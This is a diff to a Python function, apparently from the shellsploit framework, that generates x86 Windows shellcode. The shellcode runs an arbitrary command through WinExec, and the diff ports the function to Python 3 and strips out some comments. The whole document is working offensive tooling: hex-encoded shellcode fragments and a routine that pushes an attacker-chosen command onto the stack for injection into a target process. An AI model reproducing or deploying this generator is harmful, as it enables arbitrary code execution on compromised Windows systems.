@@ -1,5 +1,5 @@
 #Work already test on w7,w8,w10(x86/x86_x64)
-
+import codecs
 
 def WinExec( command):
 	from re import findall
@@ -11,22 +11,22 @@ def WinExec( command):
 	fill += "f01c645390e75f68b7a2401c7668b2"
 	fill += "c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd"
 	if len(command) == 4:
-		stack = "%s" % (command.encode('hex'))
-		data = findall("..?", stack)				#
-		fill += "68"+"".join(data)					#
-	else:											# 
-		if len(command)%4 == 3:						#This part will provide by us.						
-			padd = "\x20"							#To help add 3rd scripts add to shellsploit.
-		elif len(command)%4 == 2:					#Future feature ..
-			padd = "\x20"*2							#
-		elif len(command)%4 == 1:					#
-			padd = "\x20"*3							#
+		stack = "%s" % (codecs.encode(command, 'hex'))
+		data = findall("..?", stack)				
+		fill += "68"+"".join(data)				
+	else:											
+		if len(command)%4 == 3:										
+			padd = "\x20"							
+		elif len(command)%4 == 2:				
+			padd = "\x20"*2							
+		elif len(command)%4 == 1:					
+			padd = "\x20"*3							
 		else:
 			padd = ""
 		command = command + padd
 		fixmesempai = findall('....?', command)
 		for x in fixmesempai[::-1]:
-			first = str(x[::-1].encode("hex"))
+			first = str(codecs.encode(x[::-1].encode('utf-8'), 'hex'))
 			second = findall("..?", first)[::-1]
 			fill += "68"+"".join(second)
 	fill += "89e2415152ffd7e886ffffff8b34af0"
@@ -34,5 +34,6 @@ def WinExec( command):
 	fill += "6f6375e98b7a2401c7668b2c6f8b7a1c"
 	fill += "01c78b7caffc01c731c951ffd7"
 	return "\\x"+"\\x".join(findall("..?", fill))
+
 
 
